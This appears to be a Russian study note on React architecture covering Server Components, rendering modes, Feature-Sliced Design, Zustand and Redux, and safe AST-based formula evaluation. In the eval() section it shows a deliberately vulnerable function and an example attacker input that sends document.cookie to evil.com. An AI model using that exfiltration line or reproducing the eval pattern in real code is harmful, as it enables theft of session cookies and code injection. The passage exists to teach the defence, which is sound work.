---
created: 2026-03-17
updated: 2026-03-17
category: React
type: topic
priority: high
status: completed
tags: [react, rsc, fsd, zustand, ast, architecture]
difficulty: advanced
estimated_hours: 10
---

# React Архитектура: FSD, RSC и Управление состоянием

> **Назначение:** Современные подходы к архитектуре React-приложений: Feature-Sliced Design, React Server Components, продвинутое управление состоянием. Включает практические примеры и лучшие практики.

---

## 1. React Server Components (RSC)

### 1.1. Архитектура RSC

```
┌─────────────────────────────────────────────────────────┐
│              Next.js App Router Architecture            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────────┐         ┌─────────────────┐       │
│  │ Server Components│         │ Client Components│       │
│  │ (по умолчанию)  │         │ ('use client')   │       │
│  ├─────────────────┤         ├─────────────────┤       │
│  │ ✅ Доступ к БД  │         │ ✅ useState      │       │
│  │ ✅ Файловая система│       │ ✅ useEffect     │       │
│  │ ✅ Токены безопасности│   │ ✅ Event handlers│       │
│  │ ✅ Большие библиотеки│   │ ✅ Browser APIs  │       │
│  │ ❌ Без интерактива│     │ ❌ Нет прямого   │       │
│  │                 │         │    доступа к БД  │       │
│  └─────────────────┘         └─────────────────┘       │
│                                                         │
│  Сервер → RSC Payload → Клиент → Гидратация → UI       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 1.2. Server Components: Примеры использования

**Прямой доступ к БД:**
```tsx
// app/users/page.tsx — Server Component по умолчанию
import { db } from '@/lib/db';

export default async function UsersPage() {
    // Прямой запрос к базе (без API!)
    const users = await db.query('SELECT * FROM users');
    
    return (
        <div>
            <h1>Users</h1>
            <ul>
                {users.map(user => (
                    <li key={user.id}>{user.name}</li>
                ))}
            </ul>
        </div>
    );
}
```

**Использование больших библиотек (не попадают в бандл):**
```tsx
// app/blog/[slug]/page.tsx
import { remark } from 'remark';
import remarkHtml from 'remark-html';
import { db } from '@/lib/db';

export default async function BlogPost({ params }) {
    const post = await db.posts.find(params.slug);
    
    // remark ~100KB — только на сервере!
    const content = await remark()
        .use(remarkHtml)
        .process(post.content);
    
    return (
        <article>
            <h1>{post.title}</h1>
            <div dangerouslySetInnerHTML={{ __html: content.toString() }} />
        </article>
    );
}
```

**Композиция Server + Client компонентов:**
```tsx
// app/products/page.tsx
import { SearchFilters } from './search-filters';  // Client Component
import { ProductList } from './product-list';      // Server Component
import { db } from '@/lib/db';

export default async function ProductsPage({ searchParams }) {
    const products = await db.products.findMany({
        where: { category: searchParams.category }
    });
    
    return (
        <div>
            <SearchFilters />  // Интерактивный фильтр
            <ProductList products={products} />  // Статический список
        </div>
    );
}
```

```tsx
// app/products/search-filters.tsx
'use client';  // Обязательно для интерактива

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export function SearchFilters() {
    const [category, setCategory] = useState('');
    const router = useRouter();
    
    const handleFilter = () => {
        router.push(`/products?category=${category}`);
    };
    
    return (
        <div>
            <input 
                value={category} 
                onChange={(e) => setCategory(e.target.value)} 
            />
            <button onClick={handleFilter}>Filter</button>
        </div>
    );
}
```

---

### 1.3. Паттерны рендеринга

**SSR (Server-Side Rendering):**
```tsx
// Динамическая генерация при каждом запросе
export const dynamic = 'force-dynamic';

export default async function Page() {
    const data = await fetch('https://api.example.com/data', {
        cache: 'no-store'  // Без кэширования
    });
    
    return <div>{data.value}</div>;
}
```

**SSG (Static Site Generation):**
```tsx
// Генерация на этапе сборки
export default async function Page() {
    const data = await fetch('https://api.example.com/data', {
        next: { revalidate: 3600 }  // Ре-валидация через 1 час
    });
    
    return <div>{data.value}</div>;
}
```

**ISR (Incremental Static Regeneration):**
```tsx
// Обновление статических страниц по требованию
export default async function BlogPost({ params }) {
    const post = await fetch(`https://api.example.com/posts/${params.id}`, {
        next: { revalidate: 3600 }
    });
    
    return <article>{post.title}</article>;
}

// Принудительная ре-валидация
import { revalidatePath } from 'next/cache';

export async function updatePost(formData: FormData) {
    await updatePostInDB(formData);
    revalidatePath('/blog');  // Обновить кэш
}
```

**CSR (Client-Side Rendering):**
```tsx
'use client';

export default function Dashboard() {
    const [data, setData] = useState(null);
    
    useEffect(() => {
        fetch('/api/data').then(res => res.json()).then(setData);
    }, []);
    
    return <div>{data?.value}</div>;
}
```

---

## 2. Feature-Sliced Design (FSD)

### 2.1. Полная структура проекта

```
src/
├── app/                    # Инициализация приложения
│   ├── providers/         # Глобальные провайдеры
│   │   ├── StoreProvider.tsx
│   │   ├── ThemeProvider.tsx
│   │   └── index.ts
│   ├── styles/            # Глобальные стили
│   │   ├── variables.css
│   │   └── global.css
│   └── layout.tsx         # Корневой layout
│
├── pages/                 # Страницы (композиция)
│   ├── home/
│   │   ├── page.tsx
│   │   └── index.ts
│   ├── products/
│   │   ├── page.tsx
│   │   └── index.ts
│   └── router.tsx         # Маршрутизация
│
├── widgets/               # Самостоятельные блоки
│   ├── header/
│   │   ├── ui/
│   │   │   └── Header.tsx
│   │   ├── model/
│   │   │   └── selectors.ts
│   │   └── index.ts
│   ├── sidebar/
│   │   └── ...
│   └── product-grid/
│       └── ...
│
├── features/              # Бизнес-сценарии
│   ├── auth/
│   │   ├── login-form/
│   │   │   ├── ui/
│   │   │   │   └── LoginForm.tsx
│   │   │   ├── model/
│   │   │   │   ├── actions.ts
│   │   │   │   └── selectors.ts
│   │   │   └── index.ts
│   │   └── logout-button/
│   │       └── ...
│   ├── cart/
│   │   ├── add-to-cart/
│   │   └── remove-from-cart/
│   └── search/
│       └── ...
│
├── entities/              # Бизнес-сущности
│   ├── user/
│   │   ├── ui/
│   │   │   ├── UserAvatar.tsx
│   │   │   └── UserName.tsx
│   │   ├── model/
│   │   │   ├── types.ts
│   │   │   └── selectors.ts
│   │   └── index.ts
│   ├── product/
│   │   ├── ui/
│   │   │   ├── ProductCard.tsx
│   │   │   └── ProductPrice.tsx
│   │   ├── model/
│   │   │   ├── types.ts
│   │   │   └── selectors.ts
│   │   └── index.ts
│   └── order/
│       └── ...
│
└── shared/                # Переиспользуемый код
    ├── ui/                # UI-кит (атомы)
    │   ├── Button/
    │   │   ├── Button.tsx
    │   │   ├── Button.test.tsx
    │   │   └── index.ts
    │   ├── Input/
    │   └── Modal/
    ├── lib/               # Утилиты
    │   ├── api/
    │   │   ├── httpClient.ts
    │   │   └── endpoints.ts
    │   ├── helpers/
    │   └── hooks/
    ├── config/            # Конфигурация
    │   ├── api.config.ts
    │   └── app.config.ts
    └── types/             # Глобальные типы
        └── global.d.ts
```

---

### 2.2. Правила импортов

**✅ Разрешённые импорты:**
```tsx
// widgets/header/ui/Header.tsx
import { UserAvatar } from '@/entities/user';        // ↓ entities
import { LogoutButton } from '@/features/auth';      // ↓ features
import { Button } from '@/shared/ui';                // ↓ shared
import { useAuth } from '@/shared/lib/hooks';        // ↓ shared
```

**❌ Запрещённые импорты:**
```tsx
// entities/user/model/selectors.ts
import { Header } from '@/widgets/header';  // ❌ Импорт вверх!
import { LoginForm } from '@/features/auth'; // ❌ Импорт вверх!

// features/auth/login-form/ui/LoginForm.tsx
import { ProductCard } from '@/entities/product';  // ❌ Cross-slice!
```

---

### 2.3. Public API

**entities/user/index.ts:**
```tsx
// Экспортируем только публичный API
export { UserAvatar } from './ui/UserAvatar';
export { UserName } from './ui/UserName';
export type { User } from './model/types';
export { selectUserById, selectAllUsers } from './model/selectors';
```

**shared/ui/index.ts:**
```tsx
export { Button } from './Button';
export { Input } from './Input';
export { Modal } from './Modal';
export type { ButtonProps } from './Button';
export type { InputProps } from './Input';
```

---

## 3. Управление состоянием

### 3.1. Zustand: Продвинутые паттерны

**Базовый стор:**
```tsx
// shared/lib/store/createCartStore.ts
import { create } from 'zustand';
import { persist } from 'zustand/middleware';

interface CartItem {
    id: string;
    name: string;
    price: number;
    quantity: number;
}

interface CartState {
    items: CartItem[];
    addItem: (item: CartItem) => void;
    removeItem: (id: string) => void;
    updateQuantity: (id: string, quantity: number) => void;
    clearCart: () => void;
    getTotal: () => number;
}

export const useCartStore = create<CartState>()(
    persist(
        (set, get) => ({
            items: [],
            
            addItem: (item) => {
                set((state) => {
                    const existing = state.items.find(i => i.id === item.id);
                    
                    if (existing) {
                        return {
                            items: state.items.map(i =>
                                i.id === item.id
                                    ? { ...i, quantity: i.quantity + 1 }
                                    : i
                            )
                        };
                    }
                    
                    return { items: [...state.items, { ...item, quantity: 1 }] };
                });
            },
            
            removeItem: (id) => {
                set((state) => ({
                    items: state.items.filter(i => i.id !== id)
                }));
            },
            
            updateQuantity: (id, quantity) => {
                set((state) => ({
                    items: state.items.map(i =>
                        i.id === id ? { ...i, quantity } : i
                    )
                }));
            },
            
            clearCart: () => set({ items: [] }),
            
            getTotal: () => {
                return get().items.reduce(
                    (total, item) => total + item.price * item.quantity,
                    0
                );
            }
        }),
        {
            name: 'cart-storage',  // Ключ в localStorage
            partialize: (state) => ({ items: state.items })  // Что сохранять
        }
    )
);
```

**Использование в компоненте:**
```tsx
// features/cart/ui/Cart.tsx
'use client';

import { useCartStore } from '@/shared/lib/store/createCartStore';

export function Cart() {
    // Селективная подписка — ререндер только при изменении items
    const items = useCartStore((state) => state.items);
    const addItem = useCartStore((state) => state.addItem);
    const getTotal = useCartStore((state) => state.getTotal);
    
    return (
        <div>
            <h2>Cart ({items.length})</h2>
            <p>Total: ${getTotal()}</p>
            <ul>
                {items.map(item => (
                    <li key={item.id}>
                        {item.name} x {item.quantity}
                    </li>
                ))}
            </ul>
        </div>
    );
}
```

**Использование вне компонентов:**
```tsx
// shared/lib/api/cartApi.ts
import { useCartStore } from '../store/createCartStore';

export async function syncCartWithServer() {
    // Доступ к состоянию вне компонента
    const items = useCartStore.getState().items;
    
    const response = await fetch('/api/cart/sync', {
        method: 'POST',
        body: JSON.stringify({ items })
    });
    
    // Обновление стора
    const updatedItems = await response.json();
    useCartStore.setState({ items: updatedItems });
}
```

---

### 3.2. Сравнение стейт-менеджеров

**Context API + useReducer:**
```tsx
// ❌ Проблема: все потребители перерисовываются
const CartContext = createContext<CartState>(null!);

function CartProvider({ children }) {
    const [state, dispatch] = useReducer(cartReducer, initialState);
    
    // Любое изменение state вызывает ререндер ВСЕХ потребителей
    return (
        <CartContext.Provider value={{ state, dispatch }}>
            {children}
        </CartContext.Provider>
    );
}

function CartItem() {
    const { state } = useContext(CartContext);  // Ререндер при любом изменении
    return <div>{state.items.length}</div>;
}
```

**Redux Toolkit:**
```tsx
// ✅ Селекторы предотвращают лишние ререндеры
const cartSlice = createSlice({
    name: 'cart',
    initialState: { items: [], total: 0 },
    reducers: {
        addItem: (state, action) => {
            const existing = state.items.find(i => i.id === action.payload.id);
            if (existing) {
                existing.quantity += 1;
            } else {
                state.items.push({ ...action.payload, quantity: 1 });
            }
        }
    }
});

function CartItem() {
    // Ререндер только при изменении items
    const items = useSelector((state) => state.cart.items);
    return <div>{items.length}</div>;
}
```

**Zustand:**
```tsx
// ✅ Минимум boilerplate, селективная подписка
const useCartStore = create((set) => ({
    items: [],
    addItem: (item) => set((state) => ({
        items: [...state.items, item]
    }))
}));

function CartItem() {
    const items = useCartStore((state) => state.items);
    return <div>{items.length}</div>;
}
```

---

## 4. AST-анализ и безопасные вычисления

### 4.1. Проблема с eval()

```tsx
// ❌ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ
function calculateMetric(formula: string, context: Record<string, number>) {
    // Пользователь может выполнить любой код!
    return eval(formula);
}

// Злоумышленник может отправить:
calculateMetric('process.env.SECRET_KEY', {});
calculateMetric('fetch("https://evil.com/steal?data=" + document.cookie)', {});
```

---

### 4.2. Безопасный парсинг через AST

**Использование math.js:**
```tsx
import { parse, evaluate } from 'mathjs';

function safeCalculate(formula: string, context: Record<string, number>) {
    try {
        const node = parse(formula);
        
        // Валидация AST
        const allowedOperators = ['+', '-', '*', '/', '^', 'sqrt', 'log'];
        const allowedSymbols = Object.keys(context);
        
        node.traverse((child, path, parent) => {
            if (child.isOperatorNode && !allowedOperators.includes(child.op)) {
                throw new Error(`Operator ${child.op} is not allowed`);
            }
            
            if (child.isSymbolNode && !allowedSymbols.includes(child.name)) {
                throw new Error(`Symbol ${child.name} is not allowed`);
            }
        });
        
        // Безопасное вычисление
        return evaluate(formula, context);
        
    } catch (error) {
        console.error('Invalid formula:', error);
        return null;
    }
}

// Использование
const result = safeCalculate('revenue - costs', {
    revenue: 1000,
    costs: 500
});  // 500
```

**Собственный парсер:**
```tsx
// Лексический анализ
function tokenize(expression: string): Token[] {
    const tokens: Token[] = [];
    let i = 0;
    
    while (i < expression.length) {
        const char = expression[i];
        
        if (/\d/.test(char)) {
            let num = '';
            while (i < expression.length && /\d/.test(expression[i])) {
                num += expression[i++];
            }
            tokens.push({ type: 'NUMBER', value: parseInt(num) });
        } else if (['+', '-', '*', '/'].includes(char)) {
            tokens.push({ type: 'OPERATOR', value: char });
            i++;
        } else if (char === ' ') {
            i++;
        } else {
            throw new Error(`Invalid character: ${char}`);
        }
    }
    
    return tokens;
}

// Синтаксический анализ (AST)
function parseToAST(tokens: Token[]): ASTNode {
    let pos = 0;
    
    function parseExpression(): ASTNode {
        let left = parseTerm();
        
        while (
            pos < tokens.length &&
            (tokens[pos].value === '+' || tokens[pos].value === '-')
        ) {
            const op = tokens[pos++].value;
            const right = parseTerm();
            left = { type: 'BinaryExpression', operator: op, left, right };
        }
        
        return left;
    }
    
    function parseTerm(): ASTNode {
        let left = parseFactor();
        
        while (
            pos < tokens.length &&
            (tokens[pos].value === '*' || tokens[pos].value === '/')
        ) {
            const op = tokens[pos++].value;
            const right = parseFactor();
            left = { type: 'BinaryExpression', operator: op, left, right };
        }
        
        return left;
    }
    
    function parseFactor(): ASTNode {
        const token = tokens[pos];
        
        if (token.type === 'NUMBER') {
            pos++;
            return { type: 'Literal', value: token.value };
        }
        
        throw new Error(`Unexpected token: ${token.type}`);
    }
    
    return parseExpression();
}

// Вычисление AST
function evaluateAST(node: ASTNode): number {
    switch (node.type) {
        case 'Literal':
            return node.value;
        
        case 'BinaryExpression':
            const left = evaluateAST(node.left);
            const right = evaluateAST(node.right);
            
            switch (node.operator) {
                case '+': return left + right;
                case '-': return left - right;
                case '*': return left * right;
                case '/': return left / right;
            }
    }
}

// Использование
const tokens = tokenize('10 + 20 * 3');
const ast = parseToAST(tokens);
const result = evaluateAST(ast);  // 70
```

---

## 🔗 Связанные темы

- [[03_React_Frontend/02_React_Internals_Optimization]] — React под капотом
- [[03_React_Frontend/03_NextJS_App_Router_React19]] — Next.js кэширование
- [[02_JavaScript_NodeJS/02_Advanced_JS_LiveCoding]] — Live-coding паттерны

---

*Файл обновлён: 17 марта 2026*
